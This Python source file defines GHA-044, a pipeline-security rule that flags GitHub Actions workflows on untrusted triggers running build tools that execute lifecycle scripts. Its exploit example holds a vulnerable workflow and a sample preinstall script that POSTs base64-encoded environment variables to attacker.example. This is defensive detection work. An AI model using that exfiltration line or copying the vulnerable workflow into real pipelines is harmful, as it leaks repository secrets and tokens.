"""GHA-044, build-tool invocation on an untrusted-trigger workflow.

Detects the classic Direct-PPE primitive: a workflow that fires on
``pull_request_target`` or ``workflow_run`` runs an install /
build command whose config files (``package.json`` scripts,
``Makefile`` targets, ``setup.py`` body, ``build.gradle`` /
``pom.xml`` plugins, ``Gemfile``, ``Cargo.toml``'s ``build.rs``,
…) live in the checked-out workspace. If any later step has
written PR-controlled content into that workspace, the build
tool will execute it with the workflow's secrets + write-scope
``GITHUB_TOKEN``.

GHA-002 catches the explicit ``actions/checkout`` PR-head case.
GHA-010 / GHA-032 catch local-action and local-script invocation.
GHA-044 closes the remaining gap: invoking a *standard* build tool
whose well-known config files act as the attacker payload.
"""
from __future__ import annotations

import re
from typing import Any

from ...base import Finding, Severity
from ...rule import Rule
from ..base import iter_jobs, iter_steps, workflow_triggers
from ._helpers import UNTRUSTED_TRIGGERS

RULE = Rule(
    id="GHA-044",
    title="Build tool runs lifecycle scripts on untrusted-trigger workflow",
    severity=Severity.HIGH,
    owasp=("CICD-SEC-4",),
    esf=("ESF-D-INJECTION",),
    cwe=("CWE-829", "CWE-94"),
    recommendation=(
        "Don't run install / build commands under ``pull_request_target`` "
        "or ``workflow_run`` against a tree that may be PR-controlled. "
        "Split the workflow: keep the privileged work on ``push`` / "
        "``release`` (no fork content), and run untrusted builds in a "
        "separate ``pull_request`` workflow with no secrets and a read-"
        "only ``GITHUB_TOKEN``. If you must build PR code with secrets, "
        "do it inside a container with no network egress and a minimal "
        "filesystem, never directly on the runner."
    ),
    docs_note=(
        "Package managers and build tools execute code by design. "
        "``npm install`` / ``pnpm install`` / ``yarn`` / ``bun "
        "install`` run ``preinstall`` / ``install`` / ``postinstall``"
        " / ``prepare`` from the PR's ``package.json``; ``deno "
        "install`` resolves the PR's ``deno.json`` / ``package.json`` "
        "and (when ``--allow-scripts`` opts in) runs the same npm "
        "lifecycle hooks; ``pip install .`` runs the PR's "
        "``setup.py``; ``make`` runs the PR's ``Makefile``; ``mvn`` "
        "/ ``gradle`` load plugins declared in the PR's ``pom.xml`` "
        "/ ``build.gradle``; ``cargo build`` runs ``build.rs``. "
        "Under ``pull_request_target`` / ``workflow_run``, the "
        "surrounding context already has secrets and a write-scope "
        "token, so the lifecycle hook is the entire attack."
    ),
    known_fp=(
        "Workflows that pin the workspace to a trusted ref before "
        "invoking the build tool (``actions/checkout`` with no "
        "``ref:`` override on ``pull_request_target``, or a fresh "
        "checkout of a default-branch SHA) aren't actually exposed. "
        "The rule fires on the build-tool invocation alone; suppress "
        "with a ``.pipelinecheckignore`` rationale when the "
        "workspace is provably clean.",
    ),
    incident_refs=(
        "Trail of Bits ``Public PPE`` write-up (2022): demonstrated "
        "the primitive against ``pull_request_target`` workflows "
        "that ran ``npm install`` after checking out PR content. "
        "The PR-supplied ``preinstall`` script ran with the base "
        "repo's secrets in scope. Same shape with ``pip install -e "
        ".`` (setup.py) and ``make`` (Makefile).",
        "Cycode / Legit Security ``Poisoned Pipeline Execution`` "
        "research (2022-2023) catalogued dozens of OSS repos where "
        "a privileged-trigger workflow's build step executed PR-"
        "controlled config: ``setup.py``'s ``cmdclass``, "
        "``build.gradle``'s ``init.gradle``, ``pom.xml``'s ``<build>"
        "<plugins>``. The fix pattern is always: don't build "
        "untrusted code with secrets in scope.",
    ),
    exploit_example=(
        "# Vulnerable: pull_request_target + npm install.\n"
        "name: pr-build\n"
        "on:\n"
        "  pull_request_target:\n"
        "    types: [opened, synchronize]\n"
        "jobs:\n"
        "  build:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - uses: actions/checkout@<sha>\n"
        "        with:\n"
        "          ref: ${{ github.event.pull_request.head.sha }}\n"
        "      - run: npm install         # executes package.json scripts\n"
        "\n"
        "# Attack: PR ships a tampered package.json with:\n"
        "#\n"
        "#   \"scripts\": {\n"
        "#     \"preinstall\": \"curl -X POST https://attacker.example/x \\\n"
        "#       -d \\\"$(env | base64 -w0)\\\"\"\n"
        "#   }\n"
        "#\n"
        "# ``npm install`` runs ``preinstall`` before resolving any\n"
        "# dependency, so the exfil fires the moment the workflow\n"
        "# starts. Same shape with pip install -e . (runs setup.py),\n"
        "# make (runs Makefile), mvn (runs pom.xml plugins), gradle\n"
        "# (runs init scripts), cargo build (runs build.rs).\n"
        "\n"
        "# Safe: split the workflow. Privileged labeler runs on\n"
        "# pull_request_target with secrets but never installs the\n"
        "# PR. The build runs on pull_request with no secrets:\n"
        "name: build\n"
        "on: { pull_request: {} }\n"
        "jobs:\n"
        "  build:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - uses: actions/checkout@<sha>\n"
        "      - run: npm install         # no secrets in scope"
    ),
)

# Each entry: ``(label, regex)``. Regex must match at start of line
# (after optional whitespace) so ``echo \"running npm install\"`` in
# a comment doesn't fire. The patterns are deliberately narrow:
# ``npm install`` / ``npm ci`` / ``npm i`` and the bun / deno
# equivalents, but not ``npm run lint`` / ``bun run dev`` / ``deno
# task test`` (which target named scripts, not install-time hooks).
_BUILD_TOOL_PATTERNS: tuple[tuple[str, re.Pattern[str]], ...] = (
    ("npm install/ci",
     re.compile(r"^\s*(?:sudo\s+)?npm\s+(?:install|ci|i)(?:\s|$)")),
    ("pnpm install",
     re.compile(r"^\s*(?:sudo\s+)?pnpm\s+(?:install|i)(?:\s|$)")),
    ("yarn install",
     re.compile(r"^\s*(?:sudo\s+)?yarn(?:\s+install)?(?:\s|$)")),
    ("bun install",
     re.compile(r"^\s*(?:sudo\s+)?bun\s+(?:install|i)(?:\s|$)")),
    ("deno install",
     # ``deno install`` (Deno 2.x, no args) resolves project deps
     # from ``deno.json`` / ``package.json`` and, with ``--allow-
     # scripts`` set, runs the same npm lifecycle hooks. The older
     # ``deno install <url>`` global form caches a workspace-
     # resolved script and registers it as a binary, same PR-
     # controlled bytes either way.
     re.compile(r"^\s*(?:sudo\s+)?deno\s+install(?:\s|$)")),
    ("pip install local",
     # ``pip install .`` / ``pip install -e .`` / ``pip install ./pkg``,
     # plus long-form variants: ``pip install --editable .``,
     # ``pip install --no-deps .``, ``pip install --user .``,
     # ``pip install --prefix=/opt .``. Mixed short / long flags work
     # too: ``pip install --no-deps -e .``. Matches ``python -m pip
     # install …`` and ``pip3``. Does NOT match ``pip install -r
     # requirements.txt`` (no setup.py auto-execution) or ``pip
     # install requests`` (named-package install). The fused
     # ``--editable=.`` form is out of scope (rare); use the space-
     # separated form for the rule to fire.
     re.compile(
         r"^\s*(?:sudo\s+)?(?:python3?\s+-m\s+)?pip3?\s+install\b"
         r"(?:\s+--?[A-Za-z][\w-]*(?:=\S+)?)*"
         r"\s+(?:(?:-e|--editable)\s+)?"
         r"\.(?:/\S*)?(?:\s|$)"
     )),
    ("setup.py",
     re.compile(r"^\s*(?:sudo\s+)?python3?\s+setup\.py(?:\s|$)")),
    ("python -m build",
     re.compile(r"^\s*(?:sudo\s+)?python3?\s+-m\s+build(?:\s|$)")),
    ("make",
     # Plain ``make`` or ``make <target>``. Excludes ``makedirs``,
     # ``makepkg``, etc. via a trailing word-boundary.
     re.compile(r"^\s*(?:sudo\s+)?make\b(?!\w)")),
    ("mvn",
     re.compile(r"^\s*(?:sudo\s+)?(?:\./)?mvnw?\b")),
    ("gradle",
     re.compile(r"^\s*(?:sudo\s+)?(?:\./)?gradlew?\b")),
    ("bundle install",
     re.compile(r"^\s*(?:sudo\s+)?bundle\s+(?:install|exec)(?:\s|$)")),
    ("composer install",
     re.compile(r"^\s*(?:sudo\s+)?composer\s+(?:install|update)(?:\s|$)")),
    ("cargo build",
     # ``cargo build`` / ``cargo test`` / ``cargo run`` all compile
     # the workspace, which runs ``build.rs``.
     re.compile(r"^\s*(?:sudo\s+)?cargo\s+(?:build|test|run|check)(?:\s|$)")),
    ("go generate",
     # ``go generate`` executes directives baked into source files;
     # ``go build`` doesn't auto-run external scripts so it's omitted.
     re.compile(r"^\s*(?:sudo\s+)?go\s+generate(?:\s|$)")),
)


def _scan_run(run_body: str) -> str | None:
    """Return the label of the first build-tool pattern that matches
    a line of *run_body*, or ``None`` if no pattern fires."""
    for line in run_body.splitlines():
        # Strip leading ``- `` / ``| `` continuations that survive
        # YAML loading in edge cases.
        for label, pat in _BUILD_TOOL_PATTERNS:
            if pat.search(line):
                return label
    return None


def check(path: str, doc: dict[str, Any]) -> Finding:
    triggers = set(workflow_triggers(doc))
    matching = triggers & UNTRUSTED_TRIGGERS
    if not matching:
        return Finding(
            check_id=RULE.id, title=RULE.title, severity=RULE.severity,
            resource=path,
            description="Workflow has no untrusted trigger.",
            recommendation="No action required.", passed=True,
        )
    offenders: list[str] = []
    for job_id, job in iter_jobs(doc):
        for idx, step in enumerate(iter_steps(job)):
            run = step.get("run")
            if not isinstance(run, str):
                continue
            hit = _scan_run(run)
            if hit is not None:
                offenders.append(f"{job_id}[{idx}]: {hit}")
    passed = not offenders
    desc = (
        f"No build-tool invocation detected on untrusted trigger(s) "
        f"{sorted(matching)}."
        if passed else
        f"Workflow with untrusted trigger ({', '.join(sorted(matching))}) "
        f"runs build tool(s) that auto-execute lifecycle scripts from "
        f"workspace config: {', '.join(offenders[:5])}"
        f"{'…' if len(offenders) > 5 else ''}. If the workspace ever "
        f"contains PR-controlled content, the tool runs that code with "
        f"the workflow's secrets in scope."
    )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=path, description=desc,
        recommendation=RULE.recommendation, passed=passed,
    )
